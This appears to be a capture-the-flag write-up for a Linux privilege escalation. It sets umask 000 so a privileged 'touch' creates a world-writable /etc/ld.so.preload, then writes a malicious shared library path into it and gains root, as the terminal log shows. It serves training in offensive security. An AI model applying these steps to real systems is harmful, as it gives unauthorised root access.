#https://drive.google.com/file/d/1d3V7IJl2Jh32uyuRYhDw6ZH4l08rQJq4/view
#https://book.hacktricks.xyz/linux-hardening/privilege-escalation/write-to-root#etc-ld.so.preload

'''
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
umask 000 #then the touch file will be rw-rw-rw-

base64 -w0 pe.so
seems too long to copy one time to a file, always turcated in terminal...
while not_end_of_the_base64_string:
	echo part_of_the_base64_string >> pe.txt

base64 -d pe.txt > /tmp/pe.so
touch /etc/ld.so.preload
echo "/tmp/pe.so" > /etc/ld.so.preload
touch x

ctf@misctouchmp-1061206-5456d4459d-blgk4:~$ ls
ls
pe.txt
touch
ctf@misctouchmp-1061206-5456d4459d-blgk4:~$ base64 -d pe.txt > /tmp/pe.so
base64 -d pe.txt > /tmp/pe.so
ctf@misctouchmp-1061206-5456d4459d-blgk4:~$ ls /tmp/pe.so
ls /tmp/pe.so
/tmp/pe.so
ctf@misctouchmp-1061206-5456d4459d-blgk4:~$ umask 000
umask 000
ctf@misctouchmp-1061206-5456d4459d-blgk4:~$ touch /etc/ld.so.preload
touch /etc/ld.so.preload
ctf@misctouchmp-1061206-5456d4459d-blgk4:~$ ls -l /etc/ld.so.preload
ls -l /etc/ld.so.preload
-rw-rw-rw- 1 root root 0 Apr 10 13:24 /etc/ld.so.preload
ctf@misctouchmp-1061206-5456d4459d-blgk4:~$ echo "/tmp/pe.so" > /etc/ld.so.preload
<59d-blgk4:~$ echo "/tmp/pe.so" > /etc/ld.so.preload
ctf@misctouchmp-1061206-5456d4459d-blgk4:~$ touch x
touch x
ls
pe.txt
touch
cat /flag.txt
cat: /flag.txt: No such file or directory
cat /root/flag.txt
HTB{d75bdf6f50f17a639935792367e4788f}
id
uid=0(root) gid=0(root) groups=0(root)

'''
